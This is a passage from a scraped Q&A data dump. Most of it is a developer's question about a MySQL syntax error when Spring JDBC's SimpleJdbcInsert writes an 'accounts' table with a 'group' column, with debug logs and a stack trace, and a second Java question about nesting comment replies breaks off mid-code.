[nio-9090-exec-1] o.s.j.c.metadata.TableMetaDataProvider   : Retrieved meta-data: interestRate 7 true\r\n    2019-06-15 21:21:12.142 DEBUG 32737 --- [nio-9090-exec-1] o.s.j.c.metadata.TableMetaDataProvider   : Retrieved meta-data: taxes 7 true\r\n    2019-06-15 21:21:12.143 DEBUG 32737 --- [nio-9090-exec-1] o.s.j.c.metadata.TableMetaDataProvider   : Retrieved meta-data: prevMonthEquity 7 true\r\n    2019-06-15 21:21:12.143 DEBUG 32737 --- [nio-9090-exec-1] o.s.j.c.metadata.TableMetaDataProvider   : Retrieved meta-data: prevEquity 7 true\r\n    2019-06-15 21:21:12.143 DEBUG 32737 --- [nio-9090-exec-1] o.s.j.c.metadata.TableMetaDataProvider   : Retrieved meta-data: registrationDate 4 true\r\n    2019-06-15 21:21:12.143 DEBUG 32737 --- [nio-9090-exec-1] o.s.j.c.metadata.TableMetaDataProvider   : Retrieved meta-data: lastConnectionDate 4 true\r\n    2019-06-15 21:21:12.143 DEBUG 32737 --- [nio-9090-exec-1] o.s.jdbc.core.simple.SimpleJdbcInsert    : Compiled insert object: insert string is [INSERT INTO accounts (enable, readOnlyAccount, group, leverage, agentAccount, balance, prevMonthBalance, prevBalance, credit, interestRate, taxes, prevMonthEquity, prevEquity, registrationDate, lastConnectionDate) VALUES(?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)]\r\n    2019-06-15 21:21:12.143 DEBUG 32737 --- [nio-9090-exec-1] o.s.jdbc.core.simple.SimpleJdbcInsert    : JdbcInsert for table [accounts] compiled\r\n    2019-06-15 21:21:12.157 DEBUG 32737 --- [nio-9090-exec-1] o.s.jdbc.core.simple.SimpleJdbcInsert    : The following parameters are used for call INSERT INTO accounts (enable, readOnlyAccount, group, leverage, agentAccount, balance, prevMonthBalance, prevBalance, credit, interestRate, taxes, prevMonthEquity, prevEquity, registrationDate, lastConnectionDate) VALUES(?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?) with: [org.springframework.jdbc.core.SqlParameterValue@6b0bd4d, org.springframework.jdbc.core.SqlParameterValue@5c5caccd, org.springframework.jdbc.core.SqlParameterValue@53bfcc87, org.springframework.jdbc.core.SqlParameterValue@f3f8b3f, org.springframework.jdbc.core.SqlParameterValue@c661540, org.springframework.jdbc.core.SqlParameterValue@35e5fac5, org.springframework.jdbc.core.SqlParameterValue@1893d30a, org.springframework.jdbc.core.SqlParameterValue@6b86d554, org.springframework.jdbc.core.SqlParameterValue@57f61171, org.springframework.jdbc.core.SqlParameterValue@4ddffa98, org.springframework.jdbc.core.SqlParameterValue@4bd27baa, org.springframework.jdbc.core.SqlParameterValue@16232bf1, org.springframework.jdbc.core.SqlParameterValue@71b9dddd, org.springframework.jdbc.core.SqlParameterValue@4300e248, org.springframework.jdbc.core.SqlParameterValue@1bd7dea9]\r\n    2019-06-15 21:21:12.159 DEBUG 32737 --- [nio-9090-exec-1] o.s.jdbc.core.JdbcTemplate               : Executing SQL update and returning generated keys\r\n    2019-06-15 21:21:12.161 DEBUG 32737 --- [nio-9090-exec-1] o.s.jdbc.core.JdbcTemplate               : Executing prepared SQL statement\r\n    2019-06-15 21:21:12.162 DEBUG 32737 --- [nio-9090-exec-1] o.s.jdbc.core.simple.SimpleJdbcInsert    : Using generated keys support with array of column names.\r\n    2019-06-15 21:21:12.207 DEBUG 32737 --- [nio-9090-exec-1] o.s.jdbc.core.StatementCreatorUtils      : Overriding type info with runtime info from SqlParameterValue: column index 1, SQL type 16, type name null\r\n    2019-06-15 21:21:12.208 TRACE 32737 --- [nio-9090-exec-1] o.s.jdbc.core.StatementCreatorUtils      : Setting SQL statement parameter value: column index 1, parameter value [true], value class [java.lang.Boolean], SQL type 16\r\n    2019-06-15 21:21:12.218 DEBUG 32737 --- [nio-9090-exec-1] o.s.jdbc.core.StatementCreatorUtils      : Overriding type info with runtime info from SqlParameterValue: column index 2, SQL type 16, type name null\r\n    2019-06-15 21:21:12.219 TRACE 32737 --- [nio-9090-exec-1] o.s.jdbc.core.StatementCreatorUtils      : Setting SQL statement parameter value: column index 2, parameter value [false], value class [java.lang.Boolean], SQL type 16\r\n    2019-06-15 21:21:12.219 DEBUG 32737 --- [nio-9090-exec-1] o.s.jdbc.core.StatementCreatorUtils      : Overriding type info with runtime info from SqlParameterValue: column index 3, SQL type 12, type name null\r\n    2019-06-15 21:21:12.219 TRACE 32737 --- [nio-9090-exec-1] o.s.jdbc.core.StatementCreatorUtils      : Setting SQL statement parameter value: column index 3, parameter value [group-2], value class [java.lang.String], SQL type 12\r\n    2019-06-15 21:21:12.220 DEBUG 32737 --- [nio-9090-exec-1] o.s.jdbc.core.StatementCreatorUtils      : Overriding type info with runtime info from SqlParameterValue: column index 4, SQL type 4, type name null\r\n    2019-06-15 21:21:12.220 TRACE 32737 --- [nio-9090-exec-1] o.s.jdbc.core.StatementCreatorUtils      : Setting SQL statement parameter value: column index 4, parameter value [10], value class [java.lang.Integer], SQL type 4\r\n    2019-06-15 21:21:12.221 DEBUG 32737 --- [nio-9090-exec-1] o.s.jdbc.core.StatementCreatorUtils      : Overriding type info with runtime info from SqlParameterValue: column index 5, SQL type 4, type name null\r\n    2019-06-15 21:21:12.222 TRACE 32737 --- [nio-9090-exec-1] o.s.jdbc.core.StatementCreatorUtils      : Setting SQL statement parameter value: column index 5, parameter value [10043], value class [java.lang.Integer], SQL type 4\r\n    2019-06-15 21:21:12.222 DEBUG 32737 --- [nio-9090-exec-1] o.s.jdbc.core.StatementCreatorUtils      : Overriding type info with runtime info from SqlParameterValue: column index 6, SQL type 8, type name null\r\n    2019-06-15 21:21:12.222 TRACE 32737 --- [nio-9090-exec-1] o.s.jdbc.core.StatementCreatorUtils      : Setting SQL statement parameter value: column index 6, parameter value [1.0], value class [java.lang.Double], SQL type 8\r\n    2019-06-15 21:21:12.223 DEBUG 32737 --- [nio-9090-exec-1] o.s.jdbc.core.StatementCreatorUtils      : Overriding type info with runtime info from SqlParameterValue: column index 7, SQL type 8, type name null\r\n    2019-06-15 21:21:12.223 TRACE 32737 --- [nio-9090-exec-1] o.s.jdbc.core.StatementCreatorUtils      : Setting SQL statement parameter value: column index 7, parameter value [1.0], value class [java.lang.Double], SQL type 8\r\n    2019-06-15 21:21:12.223 DEBUG 32737 --- [nio-9090-exec-1] o.s.jdbc.core.StatementCreatorUtils      : Overriding type info with runtime info from SqlParameterValue: column index 8, SQL type 8, type name null\r\n    2019-06-15 21:21:12.223 TRACE 32737 --- [nio-9090-exec-1] o.s.jdbc.core.StatementCreatorUtils      : Setting SQL statement parameter value: column index 8, parameter value [1.0], value class [java.lang.Double], SQL type 8\r\n    2019-06-15 21:21:12.223 DEBUG 32737 --- [nio-9090-exec-1] o.s.jdbc.core.StatementCreatorUtils      : Overriding type info with runtime info from SqlParameterValue: column index 9, SQL type 8, type name null\r\n    2019-06-15 21:21:12.223 TRACE 32737 --- [nio-9090-exec-1] o.s.jdbc.core.StatementCreatorUtils      : Setting SQL statement parameter value: column index 9, parameter value [1.0], value class [java.lang.Double], SQL type 8\r\n    2019-06-15 21:21:12.223 DEBUG 32737 --- [nio-9090-exec-1] o.s.jdbc.core.StatementCreatorUtils      : Overriding type info with runtime info from SqlParameterValue: column index 10, SQL type 8, type name null\r\n    2019-06-15 21:21:12.223 TRACE 32737 --- [nio-9090-exec-1] o.s.jdbc.core.StatementCreatorUtils      : Setting SQL statement parameter value: column index 10, parameter value [1.0], value class [java.lang.Double], SQL type 8\r\n    2019-06-15 21:21:12.223 DEBUG 32737 --- [nio-9090-exec-1] o.s.jdbc.core.StatementCreatorUtils      : Overriding type info with runtime info from SqlParameterValue: column index 11, SQL type 8, type name null\r\n    2019-06-15 21:21:12.223 TRACE 32737 --- [nio-9090-exec-1] o.s.jdbc.core.StatementCreatorUtils      : Setting SQL statement parameter value: column index 11, parameter value [1.0], value class [java.lang.Double], SQL type 8\r\n    2019-06-15 21:21:12.223 DEBUG 32737 --- [nio-9090-exec-1] o.s.jdbc.core.StatementCreatorUtils      : Overriding type info with runtime info from SqlParameterValue: column index 12, SQL type 8, type name null\r\n    2019-06-15 21:21:12.224 TRACE 32737 --- [nio-9090-exec-1] o.s.jdbc.core.StatementCreatorUtils      : Setting SQL statement parameter value: column index 12, parameter value [1.0], value class [java.lang.Double], SQL type 8\r\n    2019-06-15 21:21:12.224 DEBUG 32737 --- [nio-9090-exec-1] o.s.jdbc.core.StatementCreatorUtils      : Overriding type info with runtime info from SqlParameterValue: column index 13, SQL type 8, type name null\r\n    2019-06-15 21:21:12.224 TRACE 32737 --- [nio-9090-exec-1] o.s.jdbc.core.StatementCreatorUtils      : Setting SQL statement parameter value: column index 13, parameter value [1.0], value class [java.lang.Double], SQL type 8\r\n    2019-06-15 21:21:12.224 DEBUG 32737 --- [nio-9090-exec-1] o.s.jdbc.core.StatementCreatorUtils      : Overriding type info with runtime info from SqlParameterValue: column index 14, SQL type 4, type name null\r\n    2019-06-15 21:21:12.224 TRACE 32737 --- [nio-9090-exec-1] o.s.jdbc.core.StatementCreatorUtils      : Setting SQL statement parameter value: column index 14, parameter value [1], value class [java.lang.Integer], SQL type 4\r\n    2019-06-15 21:21:12.224 DEBUG 32737 --- [nio-9090-exec-1] o.s.jdbc.core.StatementCreatorUtils      : Overriding type info with runtime info from SqlParameterValue: column index 15, SQL type 4, type name null\r\n    2019-06-15 21:21:12.228 TRACE 32737 --- [nio-9090-exec-1] o.s.jdbc.core.StatementCreatorUtils      : Setting SQL statement parameter value: column index 15, parameter value [1], value class [java.lang.Integer], SQL type 4\r\n    2019-06-15 21:21:12.365 ERROR 32737 --- [nio-9090-exec-1] o.a.c.c.C.[.[.[/].[dispatcherServlet]    : Servlet.service() for servlet [dispatcherServlet] in context with path [] threw exception [Request processing failed; nested exception is org.springframework.jdbc.BadSqlGrammarException: PreparedStatementCallback; bad SQL grammar []; nested exception is java.sql.SQLSyntaxErrorException: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;group, leverage, agentAccount, balance, prevMonthBalance, prevBalance, credit, i&#39; at line 1] with root cause\r\n\r\n\r\nException:\r\n\r\n\r\n    java.sql.SQLSyntaxErrorException: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;group, leverage, agentAccount, balance, prevMonthBalance, prevBalance, credit, i&#39; at line 1\r\n    \tat com.mysql.cj.jdbc.exceptions.SQLError.createSQLException(SQLError.java:120) ~[mysql-connector-java-8.0.16.jar:8.0.16]\r\n    \tat com.mysql.cj.jdbc.exceptions.SQLError.createSQLException(SQLError.java:97) ~[mysql-connector-java-8.0.16.jar:8.0.16]\r\n    \tat com.mysql.cj.jdbc.exceptions.SQLExceptionsMapping.translateException(SQLExceptionsMapping.java:122) ~[mysql-connector-java-8.0.16.jar:8.0.16]\r\n    \tat com.mysql.cj.jdbc.ClientPreparedStatement.executeInternal(ClientPreparedStatement.java:955) ~[mysql-connector-java-8.0.16.jar:8.0.16]\r\n    \tat com.mysql.cj.jdbc.ClientPreparedStatement.executeUpdateInternal(ClientPreparedStatement.java:1094) ~[mysql-connector-java-8.0.16.jar:8.0.16]\r\n    \tat com.mysql.cj.jdbc.ClientPreparedStatement.executeUpdateInternal(ClientPreparedStatement.java:1042) ~[mysql-connector-java-8.0.16.jar:8.0.16]\r\n    \tat com.mysql.cj.jdbc.ClientPreparedStatement.executeLargeUpdate(ClientPreparedStatement.java:1345) ~[mysql-connector-java-8.0.16.jar:8.0.16]\r\n    \tat com.mysql.cj.jdbc.ClientPreparedStatement.executeUpdate(ClientPreparedStatement.java:1027) ~[mysql-connector-java-8.0.16.jar:8.0.16]\r\n\r\n\r\n","title":"SQLSyntaxErrorException in Spring JDBC with BeanPropertySqlParameterSource","body":"<p>I use Spring JDBC in my SpringBoot application.\nThis is one of my data classes:</p>\n\n<pre><code>@Getter\n@Setter\n@NoArgsConstructor\n@Wither\n@Builder\n@AllArgsConstructor\npublic class MTAccountData {\n    private int id;\n    private boolean enable;\n    private boolean readOnlyAccount;\n    private String group;\n    private int leverage;\n    private int agentAccount;\n    private double balance;\n    private double prevMonthBalance;\n    private double prevBalance;\n    private double credit;\n    private double interestRate;\n    private double taxes;\n    private double prevMonthEquity;\n    private double prevEquity;\n    private int registrationDate;\n    private int lastConnectionDate;\n}\n</code></pre>\n\n<p>And MySQL table is as follows:</p>\n\n<pre><code>CREATE TABLE `accounts` (\n  `id` int(11) NOT NULL AUTO_INCREMENT,\n  `enable` bit(1) DEFAULT NULL,\n  `readOnlyAccount` bit(1) DEFAULT NULL,\n  `group` varchar(45) DEFAULT NULL,\n  `leverage` int(11) DEFAULT NULL,\n  `agentAccount` int(11) DEFAULT NULL,\n  `balance` float DEFAULT NULL,\n  `prevMonthBalance` float DEFAULT NULL,\n  `prevBalance` float DEFAULT NULL,\n  `credit` float DEFAULT NULL,\n  `interestRate` float DEFAULT NULL,\n  `taxes` float DEFAULT NULL,\n  `prevMonthEquity` float DEFAULT NULL,\n  `prevEquity` float DEFAULT NULL,\n  `registrationDate` int(11) DEFAULT NULL,\n  `lastConnectionDate` int(11) DEFAULT NULL,\n  PRIMARY KEY (`id`)\n) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;\n</code></pre>\n\n<p>In my service class I have a method to save a new account to MySQL database:</p>\n\n<pre><code>private void saveAccount(Integer companyId, MTAccountData account) {\n        SqlParameterSource accountParameters = new BeanPropertySqlParameterSource(account);\n        int generatedAccountId = new SimpleJdbcInsert(dataSource) //\n                .usingGeneratedKeyColumns(\"ID\") //\n                .withTableName(tableName(companyId)) //\n                .executeAndReturnKey(accountParameters) //\n                .intValue();\n        account.setId(generatedAccountId);\n    }\n</code></pre>\n\n<p>I enabled Spring JDBC debugging and it prints debug logs when I try to save a record but I get the exception that is seen at the end of my post.\nI couldn't figure out the reason... Is there something wrong with the save method?</p>\n\n<pre><code>2019-06-15 21:21:11.926  INFO 32737 --- [nio-9090-exec-1] o.a.c.c.C.[Tomcat].[localhost].[/]       : Initializing Spring DispatcherServlet 'dispatcherServlet'\n2019-06-15 21:21:11.926  INFO 32737 --- [nio-9090-exec-1] o.s.web.servlet.DispatcherServlet        : Initializing Servlet 'dispatcherServlet'\n2019-06-15 21:21:11.937  INFO 32737 --- [nio-9090-exec-1] o.s.web.servlet.DispatcherServlet        : Completed initialization in 11 ms\n2019-06-15 21:21:12.073 DEBUG 32737 --- [nio-9090-exec-1] o.s.jdbc.core.simple.SimpleJdbcInsert    : JdbcInsert not compiled before execution - invoking compile\n2019-06-15 21:21:12.099 DEBUG 32737 --- [nio-9090-exec-1] o.s.j.c.m.TableMetaDataProviderFactory   : Using GenericTableMetaDataProvider\n2019-06-15 21:21:12.099 DEBUG 32737 --- [nio-9090-exec-1] o.s.j.c.metadata.TableMetaDataProvider   : GetGeneratedKeys is supported\n2019-06-15 21:21:12.099 DEBUG 32737 --- [nio-9090-exec-1] o.s.j.c.metadata.TableMetaDataProvider   : GeneratedKeysColumnNameArray is supported for MySQL\n2019-06-15 21:21:12.127 DEBUG 32737 --- [nio-9090-exec-1] o.s.j.c.metadata.TableMetaDataProvider   : Retrieving meta-data for mtsync_test/root@localhost/accounts\n2019-06-15 21:21:12.140 DEBUG 32737 --- [nio-9090-exec-1] o.s.j.c.metadata.TableMetaDataProvider   : Retrieved meta-data: id 4 false\n2019-06-15 21:21:12.140 DEBUG 32737 --- [nio-9090-exec-1] o.s.j.c.metadata.TableMetaDataProvider   : Retrieved meta-data: enable -7 true\n2019-06-15 21:21:12.141 DEBUG 32737 --- [nio-9090-exec-1] o.s.j.c.metadata.TableMetaDataProvider   : Retrieved meta-data: readOnlyAccount -7 true\n2019-06-15 21:21:12.141 DEBUG 32737 --- [nio-9090-exec-1] o.s.j.c.metadata.TableMetaDataProvider   : Retrieved meta-data: group 12 true\n2019-06-15 21:21:12.141 DEBUG 32737 --- [nio-9090-exec-1] o.s.j.c.metadata.TableMetaDataProvider   : Retrieved meta-data: leverage 4 true\n2019-06-15 21:21:12.142 DEBUG 32737 --- [nio-9090-exec-1] o.s.j.c.metadata.TableMetaDataProvider   : Retrieved meta-data: agentAccount 4 true\n2019-06-15 21:21:12.142 DEBUG 32737 --- [nio-9090-exec-1] o.s.j.c.metadata.TableMetaDataProvider   : Retrieved meta-data: balance 7 true\n2019-06-15 21:21:12.142 DEBUG 32737 --- [nio-9090-exec-1] o.s.j.c.metadata.TableMetaDataProvider   : Retrieved meta-data: prevMonthBalance 7 true\n2019-06-15 21:21:12.142 DEBUG 32737 --- [nio-9090-exec-1] o.s.j.c.metadata.TableMetaDataProvider   : Retrieved meta-data: prevBalance 7 true\n2019-06-15 21:21:12.142 DEBUG 32737 --- [nio-9090-exec-1] o.s.j.c.metadata.TableMetaDataProvider   : Retrieved meta-data: credit 7 true\n2019-06-15 21:21:12.142 DEBUG 32737 --- [nio-9090-exec-1] o.s.j.c.metadata.TableMetaDataProvider   : Retrieved meta-data: interestRate 7 true\n2019-06-15 21:21:12.142 DEBUG 32737 --- [nio-9090-exec-1] o.s.j.c.metadata.TableMetaDataProvider   : Retrieved meta-data: taxes 7 true\n2019-06-15 21:21:12.143 DEBUG 32737 --- [nio-9090-exec-1] o.s.j.c.metadata.TableMetaDataProvider   : Retrieved meta-data: prevMonthEquity 7 true\n2019-06-15 21:21:12.143 DEBUG 32737 --- [nio-9090-exec-1] o.s.j.c.metadata.TableMetaDataProvider   : Retrieved meta-data: prevEquity 7 true\n2019-06-15 21:21:12.143 DEBUG 32737 --- [nio-9090-exec-1] o.s.j.c.metadata.TableMetaDataProvider   : Retrieved meta-data: registrationDate 4 true\n2019-06-15 21:21:12.143 DEBUG 32737 --- [nio-9090-exec-1] o.s.j.c.metadata.TableMetaDataProvider   : Retrieved meta-data: lastConnectionDate 4 true\n2019-06-15 21:21:12.143 DEBUG 32737 --- [nio-9090-exec-1] o.s.jdbc.core.simple.SimpleJdbcInsert    : Compiled insert object: insert string is [INSERT INTO accounts (enable, readOnlyAccount, group, leverage, agentAccount, balance, prevMonthBalance, prevBalance, credit, interestRate, taxes, prevMonthEquity, prevEquity, registrationDate, lastConnectionDate) VALUES(?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)]\n2019-06-15 21:21:12.143 DEBUG 32737 --- [nio-9090-exec-1] o.s.jdbc.core.simple.SimpleJdbcInsert    : JdbcInsert for table [accounts] compiled\n2019-06-15 21:21:12.157 DEBUG 32737 --- [nio-9090-exec-1] o.s.jdbc.core.simple.SimpleJdbcInsert    : The following parameters are used for call INSERT INTO accounts (enable, readOnlyAccount, group, leverage, agentAccount, balance, prevMonthBalance, prevBalance, credit, interestRate, taxes, prevMonthEquity, prevEquity, registrationDate, lastConnectionDate) VALUES(?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?) with: [org.springframework.jdbc.core.SqlParameterValue@6b0bd4d, org.springframework.jdbc.core.SqlParameterValue@5c5caccd, org.springframework.jdbc.core.SqlParameterValue@53bfcc87, org.springframework.jdbc.core.SqlParameterValue@f3f8b3f, org.springframework.jdbc.core.SqlParameterValue@c661540, org.springframework.jdbc.core.SqlParameterValue@35e5fac5, org.springframework.jdbc.core.SqlParameterValue@1893d30a, org.springframework.jdbc.core.SqlParameterValue@6b86d554, org.springframework.jdbc.core.SqlParameterValue@57f61171, org.springframework.jdbc.core.SqlParameterValue@4ddffa98, org.springframework.jdbc.core.SqlParameterValue@4bd27baa, org.springframework.jdbc.core.SqlParameterValue@16232bf1, org.springframework.jdbc.core.SqlParameterValue@71b9dddd, org.springframework.jdbc.core.SqlParameterValue@4300e248, org.springframework.jdbc.core.SqlParameterValue@1bd7dea9]\n2019-06-15 21:21:12.159 DEBUG 32737 --- [nio-9090-exec-1] o.s.jdbc.core.JdbcTemplate               : Executing SQL update and returning generated keys\n2019-06-15 21:21:12.161 DEBUG 32737 --- [nio-9090-exec-1] o.s.jdbc.core.JdbcTemplate               : Executing prepared SQL statement\n2019-06-15 21:21:12.162 DEBUG 32737 --- [nio-9090-exec-1] o.s.jdbc.core.simple.SimpleJdbcInsert    : Using generated keys support with array of column names.\n2019-06-15 21:21:12.207 DEBUG 32737 --- [nio-9090-exec-1] o.s.jdbc.core.StatementCreatorUtils      : Overriding type info with runtime info from SqlParameterValue: column index 1, SQL type 16, type name null\n2019-06-15 21:21:12.208 TRACE 32737 --- [nio-9090-exec-1] o.s.jdbc.core.StatementCreatorUtils      : Setting SQL statement parameter value: column index 1, parameter value [true], value class [java.lang.Boolean], SQL type 16\n2019-06-15 21:21:12.218 DEBUG 32737 --- [nio-9090-exec-1] o.s.jdbc.core.StatementCreatorUtils      : Overriding type info with runtime info from SqlParameterValue: column index 2, SQL type 16, type name null\n2019-06-15 21:21:12.219 TRACE 32737 --- [nio-9090-exec-1] o.s.jdbc.core.StatementCreatorUtils      : Setting SQL statement parameter value: column index 2, parameter value [false], value class [java.lang.Boolean], SQL type 16\n2019-06-15 21:21:12.219 DEBUG 32737 --- [nio-9090-exec-1] o.s.jdbc.core.StatementCreatorUtils      : Overriding type info with runtime info from SqlParameterValue: column index 3, SQL type 12, type name null\n2019-06-15 21:21:12.219 TRACE 32737 --- [nio-9090-exec-1] o.s.jdbc.core.StatementCreatorUtils      : Setting SQL statement parameter value: column index 3, parameter value [group-2], value class [java.lang.String], SQL type 12\n2019-06-15 21:21:12.220 DEBUG 32737 --- [nio-9090-exec-1] o.s.jdbc.core.StatementCreatorUtils      : Overriding type info with runtime info from SqlParameterValue: column index 4, SQL type 4, type name null\n2019-06-15 21:21:12.220 TRACE 32737 --- [nio-9090-exec-1] o.s.jdbc.core.StatementCreatorUtils      : Setting SQL statement parameter value: column index 4, parameter value [10], value class [java.lang.Integer], SQL type 4\n2019-06-15 21:21:12.221 DEBUG 32737 --- [nio-9090-exec-1] o.s.jdbc.core.StatementCreatorUtils      : Overriding type info with runtime info from SqlParameterValue: column index 5, SQL type 4, type name null\n2019-06-15 21:21:12.222 TRACE 32737 --- [nio-9090-exec-1] o.s.jdbc.core.StatementCreatorUtils      : Setting SQL statement parameter value: column index 5, parameter value [10043], value class [java.lang.Integer], SQL type 4\n2019-06-15 21:21:12.222 DEBUG 32737 --- [nio-9090-exec-1] o.s.jdbc.core.StatementCreatorUtils      : Overriding type info with runtime info from SqlParameterValue: column index 6, SQL type 8, type name null\n2019-06-15 21:21:12.222 TRACE 32737 --- [nio-9090-exec-1] o.s.jdbc.core.StatementCreatorUtils      : Setting SQL statement parameter value: column index 6, parameter value [1.0], value class [java.lang.Double], SQL type 8\n2019-06-15 21:21:12.223 DEBUG 32737 --- [nio-9090-exec-1] o.s.jdbc.core.StatementCreatorUtils      : Overriding type info with runtime info from SqlParameterValue: column index 7, SQL type 8, type name null\n2019-06-15 21:21:12.223 TRACE 32737 --- [nio-9090-exec-1] o.s.jdbc.core.StatementCreatorUtils      : Setting SQL statement parameter value: column index 7, parameter value [1.0], value class [java.lang.Double], SQL type 8\n2019-06-15 21:21:12.223 DEBUG 32737 --- [nio-9090-exec-1] o.s.jdbc.core.StatementCreatorUtils      : Overriding type info with runtime info from SqlParameterValue: column index 8, SQL type 8, type name null\n2019-06-15 21:21:12.223 TRACE 32737 --- [nio-9090-exec-1] o.s.jdbc.core.StatementCreatorUtils      : Setting SQL statement parameter value: column index 8, parameter value [1.0], value class [java.lang.Double], SQL type 8\n2019-06-15 21:21:12.223 DEBUG 32737 --- [nio-9090-exec-1] o.s.jdbc.core.StatementCreatorUtils      : Overriding type info with runtime info from SqlParameterValue: column index 9, SQL type 8, type name null\n2019-06-15 21:21:12.223 TRACE 32737 --- [nio-9090-exec-1] o.s.jdbc.core.StatementCreatorUtils      : Setting SQL statement parameter value: column index 9, parameter value [1.0], value class [java.lang.Double], SQL type 8\n2019-06-15 21:21:12.223 DEBUG 32737 --- [nio-9090-exec-1] o.s.jdbc.core.StatementCreatorUtils      : Overriding type info with runtime info from SqlParameterValue: column index 10, SQL type 8, type name null\n2019-06-15 21:21:12.223 TRACE 32737 --- [nio-9090-exec-1] o.s.jdbc.core.StatementCreatorUtils      : Setting SQL statement parameter value: column index 10, parameter value [1.0], value class [java.lang.Double], SQL type 8\n2019-06-15 21:21:12.223 DEBUG 32737 --- [nio-9090-exec-1] o.s.jdbc.core.StatementCreatorUtils      : Overriding type info with runtime info from SqlParameterValue: column index 11, SQL type 8, type name null\n2019-06-15 21:21:12.223 TRACE 32737 --- [nio-9090-exec-1] o.s.jdbc.core.StatementCreatorUtils      : Setting SQL statement parameter value: column index 11, parameter value [1.0], value class [java.lang.Double], SQL type 8\n2019-06-15 21:21:12.223 DEBUG 32737 --- [nio-9090-exec-1] o.s.jdbc.core.StatementCreatorUtils      : Overriding type info with runtime info from SqlParameterValue: column index 12, SQL type 8, type name null\n2019-06-15 21:21:12.224 TRACE 32737 --- [nio-9090-exec-1] o.s.jdbc.core.StatementCreatorUtils      : Setting SQL statement parameter value: column index 12, parameter value [1.0], value class [java.lang.Double], SQL type 8\n2019-06-15 21:21:12.224 DEBUG 32737 --- [nio-9090-exec-1] o.s.jdbc.core.StatementCreatorUtils      : Overriding type info with runtime info from SqlParameterValue: column index 13, SQL type 8, type name null\n2019-06-15 21:21:12.224 TRACE 32737 --- [nio-9090-exec-1] o.s.jdbc.core.StatementCreatorUtils      : Setting SQL statement parameter value: column index 13, parameter value [1.0], value class [java.lang.Double], SQL type 8\n2019-06-15 21:21:12.224 DEBUG 32737 --- [nio-9090-exec-1] o.s.jdbc.core.StatementCreatorUtils      : Overriding type info with runtime info from SqlParameterValue: column index 14, SQL type 4, type name null\n2019-06-15 21:21:12.224 TRACE 32737 --- [nio-9090-exec-1] o.s.jdbc.core.StatementCreatorUtils      : Setting SQL statement parameter value: column index 14, parameter value [1], value class [java.lang.Integer], SQL type 4\n2019-06-15 21:21:12.224 DEBUG 32737 --- [nio-9090-exec-1] o.s.jdbc.core.StatementCreatorUtils      : Overriding type info with runtime info from SqlParameterValue: column index 15, SQL type 4, type name null\n2019-06-15 21:21:12.228 TRACE 32737 --- [nio-9090-exec-1] o.s.jdbc.core.StatementCreatorUtils      : Setting SQL statement parameter value: column index 15, parameter value [1], value class [java.lang.Integer], SQL type 4\n2019-06-15 21:21:12.365 ERROR 32737 --- [nio-9090-exec-1] o.a.c.c.C.[.[.[/].[dispatcherServlet]    : Servlet.service() for servlet [dispatcherServlet] in context with path [] threw exception [Request processing failed; nested exception is org.springframework.jdbc.BadSqlGrammarException: PreparedStatementCallback; bad SQL grammar []; nested exception is java.sql.SQLSyntaxErrorException: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'group, leverage, agentAccount, balance, prevMonthBalance, prevBalance, credit, i' at line 1] with root cause\n</code></pre>\n\n<p>Exception:</p>\n\n<pre><code>java.sql.SQLSyntaxErrorException: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'group, leverage, agentAccount, balance, prevMonthBalance, prevBalance, credit, i' at line 1\n    at com.mysql.cj.jdbc.exceptions.SQLError.createSQLException(SQLError.java:120) ~[mysql-connector-java-8.0.16.jar:8.0.16]\n    at com.mysql.cj.jdbc.exceptions.SQLError.createSQLException(SQLError.java:97) ~[mysql-connector-java-8.0.16.jar:8.0.16]\n    at com.mysql.cj.jdbc.exceptions.SQLExceptionsMapping.translateException(SQLExceptionsMapping.java:122) ~[mysql-connector-java-8.0.16.jar:8.0.16]\n    at com.mysql.cj.jdbc.ClientPreparedStatement.executeInternal(ClientPreparedStatement.java:955) ~[mysql-connector-java-8.0.16.jar:8.0.16]\n    at com.mysql.cj.jdbc.ClientPreparedStatement.executeUpdateInternal(ClientPreparedStatement.java:1094) ~[mysql-connector-java-8.0.16.jar:8.0.16]\n    at com.mysql.cj.jdbc.ClientPreparedStatement.executeUpdateInternal(ClientPreparedStatement.java:1042) ~[mysql-connector-java-8.0.16.jar:8.0.16]\n    at com.mysql.cj.jdbc.ClientPreparedStatement.executeLargeUpdate(ClientPreparedStatement.java:1345) ~[mysql-connector-java-8.0.16.jar:8.0.16]\n    at com.mysql.cj.jdbc.ClientPreparedStatement.executeUpdate(ClientPreparedStatement.java:1027) ~[mysql-connector-java-8.0.16.jar:8.0.16]\n</code></pre>\n"},{"tags":["java"],"comments":[{"owner":{"account_id":15718721,"reputation":988,"user_id":11342225,"display_name":"alea"},"score":0,"creation_date":1683735529,"post_id":76217111,"comment_id":134413480,"body_markdown":"You might want to share your `DiscussionReplyRS` class or how your data looks like.","body":"You might want to share your <code>DiscussionReplyRS</code> class or how your data looks like."}],"owner":{"account_id":28566694,"reputation":1,"user_id":21869483,"display_name":"VN Nam"},"comment_count":1,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":38,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":0,"score":0,"last_activity_date":1683712883,"creation_date":1683712883,"question_id":76217111,"body_markdown":"Currently in my database there is data of posts and its comments. Each post will have many comments and comments can be level 2 3 4... Currently, I can query to get the comments level 1 of the article. And now I want my comment to have only 2 levels, level 1 and level 2 and its sub-levels\r\n\r\n\r\n```\r\n// Here is a list of comments including all levels\r\n        List&lt;DiscussionReplyRS&gt; discussionHierarchy = contentDAO.getListDiscussionReply(discussionId, spaceId).stream()\r\n                .filter(Objects::nonNull)\r\n                .map(DiscussionMapper::toDiscussionReplyRS)\r\n                .collect(Collectors.toList());\r\n\r\n        // Consider this the father of level 1 comments\r\n        Optional&lt;DiscussionReplyRS&gt; discussionChild = discussionHierarchy.stream()\r\n                .filter(dc -&gt; dc.getReplyToPostId() == 